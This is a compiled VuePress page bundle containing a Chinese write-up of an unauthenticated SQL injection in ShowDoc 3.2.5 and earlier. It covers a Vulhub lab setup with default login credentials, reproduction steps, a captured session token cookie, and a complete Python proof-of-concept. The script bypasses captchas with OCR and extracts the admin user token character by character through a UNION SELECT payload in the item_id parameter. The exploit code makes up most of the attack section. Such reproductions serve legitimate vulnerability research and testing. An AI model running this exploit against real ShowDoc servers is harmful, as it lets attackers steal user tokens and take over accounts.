import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"ShowDoc 是一个开源的在线共享文档工具。",-1),d=n("p",null,"ShowDoc <= 3.2.5 存在一处未授权 SQL 注入漏洞，攻击者可以利用该漏洞窃取保存在 SQLite 数据库中的用户密码和 Token。",-1),k=n("p",null,"参考链接：",-1),v={href:"https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda",target:"_blank",rel:"noopener noreferrer"},b=e(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ShowDoc &lt;= 3.2.5
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 ShowDoc 2.8.2 服务器：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>服务启动后，访问 <code>http://your-ip:8080</code> 即可查看到 ShowDoc 的主页。初始化成功后，使用帐号 <code>showdoc</code> 和密码 <code>123456</code> 登录用户界面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704153244765.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>当一个用户登录进 ShowDoc，其用户 token 将会被保存在 SQLite 数据库中。相比于获取 hash 后的用户密码，用户 token 是一个更好地选择。</p>`,9),m={href:"https://github.com/sml2h3/ddddocr",target:"_blank",rel:"noopener noreferrer"},g=n("div",{class:"language-text line-numbers-mode","data-ext":"text"},[n("pre",{class:"language-text"},[n("code",null,`pip install onnxruntime ddddocr requests
`)]),n("div",{class:"line-numbers","aria-hidden":"true"},[n("div",{class:"line-number"})])],-1),h={href:"https://github.com/vulhub/vulhub/blob/master/showdoc/3.2.5-sqli/poc.py",target:"_blank",rel:"noopener noreferrer"},_=e(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py -u http://your-ip:8080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704155207997.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>测试获取的 token 是否合法。</p><p>未加 token：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704161609189.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>添加 token：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Cookie: cookie_token=38f70784c511fe30f8686d5bf44bd0c5a830acd8e8c3efa9db63938f69e11f40
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240704161636254.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞-poc" tabindex="-1"><a class="header-anchor" href="#漏洞-poc" aria-hidden="true">#</a> 漏洞 POC</h2>`,9),f={href:"http://poc.py",target:"_blank",rel:"noopener noreferrer"},w=e(`<div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> argparse
<span class="token keyword">import</span> ddddocr
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> onnxruntime
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urljoin


onnxruntime<span class="token punctuation">.</span>set_default_logger_severity<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
table <span class="token operator">=</span> <span class="token string">&#39;0123456789abcdef&#39;</span>
proxies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">&#39;http&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;http://127.0.0.1:8085&#39;</span><span class="token punctuation">}</span>
ocr <span class="token operator">=</span> ddddocr<span class="token punctuation">.</span>DdddOcr<span class="token punctuation">(</span><span class="token punctuation">)</span>
ocr<span class="token punctuation">.</span>set_ranges<span class="token punctuation">(</span>table<span class="token punctuation">)</span>


<span class="token keyword">class</span> <span class="token class-name">RetryException</span><span class="token punctuation">(</span>Exception<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


<span class="token keyword">def</span> <span class="token function">retry_when_failed</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">retry_func</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
            <span class="token keyword">except</span> RetryException<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
                <span class="token keyword">raise</span> e

    <span class="token keyword">return</span> retry_func


<span class="token keyword">def</span> <span class="token function">generate_captcha</span><span class="token punctuation">(</span>base<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&quot;</span><span class="token interpolation"><span class="token punctuation">{</span>base<span class="token punctuation">}</span></span><span class="token string">?s=/api/common/createCaptcha&quot;</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
    captcha_id <span class="token operator">=</span> data<span class="token punctuation">[</span><span class="token string">&#39;data&#39;</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">&#39;captcha_id&#39;</span><span class="token punctuation">]</span>

    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;</span><span class="token interpolation"><span class="token punctuation">{</span>base<span class="token punctuation">}</span></span><span class="token string">?s=/api/common/showCaptcha&amp;captcha_id=</span><span class="token interpolation"><span class="token punctuation">{</span>captcha_id<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> response<span class="token punctuation">.</span>content
    result <span class="token operator">=</span> ocr<span class="token punctuation">.</span>classification<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    <span class="token keyword">return</span> captcha_id<span class="token punctuation">,</span> result


<span class="token decorator annotation punctuation">@retry_when_failed</span>
<span class="token keyword">def</span> <span class="token function">exploit_one</span><span class="token punctuation">(</span>base<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> current<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> ch<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>
    captcha_id<span class="token punctuation">,</span> captcha_text <span class="token operator">=</span> generate_captcha<span class="token punctuation">(</span>base<span class="token punctuation">)</span>
    data <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
        <span class="token string">&#39;s&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;/api/item/pwd&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;page_id&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;0&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;password&#39;</span><span class="token punctuation">:</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">,</span>
        <span class="token string">&#39;captcha_id&#39;</span><span class="token punctuation">:</span> captcha_id<span class="token punctuation">,</span>
        <span class="token string">&#39;captcha&#39;</span><span class="token punctuation">:</span> captcha_text<span class="token punctuation">,</span>
        <span class="token string">&#39;item_id&#39;</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f&quot;aa&#39;) UNION SELECT 1,1,1,1,1,(SELECT 1 FROM user_token WHERE uid = 1 AND token LIKE &#39;</span><span class="token interpolation"><span class="token punctuation">{</span>current<span class="token punctuation">}</span></span><span class="token interpolation"><span class="token punctuation">{</span>ch<span class="token punctuation">}</span></span><span class="token string">%&#39; LIMIT 1),1,1,1,1,1,1 FROM user_token; -- &quot;</span></span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token string">&#39;error_code&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ch
    <span class="token keyword">elif</span> data<span class="token punctuation">[</span><span class="token string">&#39;error_code&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10010</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">&#39;&#39;</span>
    <span class="token keyword">elif</span> data<span class="token punctuation">[</span><span class="token string">&#39;error_code&#39;</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10206</span><span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RetryException<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;error: </span><span class="token interpolation"><span class="token punctuation">{</span>data<span class="token conversion-option punctuation">!r</span><span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&#39;unknown exception&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">&#39;Showdoc 3.2.5 SQL injection&#39;</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">&#39;-u&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;--url&#39;</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>

    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    target <span class="token operator">=</span> urljoin<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> <span class="token string">&#39;/server/index.php&#39;</span><span class="token punctuation">)</span>
    res <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> <span class="token string">&#39;&#39;</span>
        <span class="token keyword">for</span> ch <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> exploit_one<span class="token punctuation">(</span>target<span class="token punctuation">,</span> res<span class="token punctuation">,</span> ch<span class="token punctuation">)</span>
            <span class="token keyword">if</span> r<span class="token punctuation">:</span>
                res <span class="token operator">+=</span> ch
                <span class="token keyword">break</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f&#39;Current result: </span><span class="token interpolation"><span class="token punctuation">{</span>res<span class="token punctuation">}</span></span><span class="token string">&#39;</span></span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> r<span class="token punctuation">:</span>
            <span class="token keyword">break</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,1);function y(x,S){const a=o("ExternalLinkIcon");return c(),i("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",v,[s("https://github.com/star7th/showdoc/commit/84fc28d07c5dfc894f5fbc6e8c42efd13c976fda"),t(a)])])]),b,n("p",null,[s("在利用该漏洞前，需要安装验证码识别库 "),n("a",m,[s("ddddocr"),t(a)]),s("，因为该漏洞需要每次请求前传入验证码：")]),g,n("p",null,[s("然后，执行 "),n("a",h,[s("这个POC"),t(a)]),s(" 来获取 token：")]),_,n("p",null,[n("a",f,[s("poc.py"),t(a)])]),w])}const q=p(l,[["render",y],["__file","ShowDoc 3.2.5 SQL注入漏洞.html.vue"]]);export{q as default};
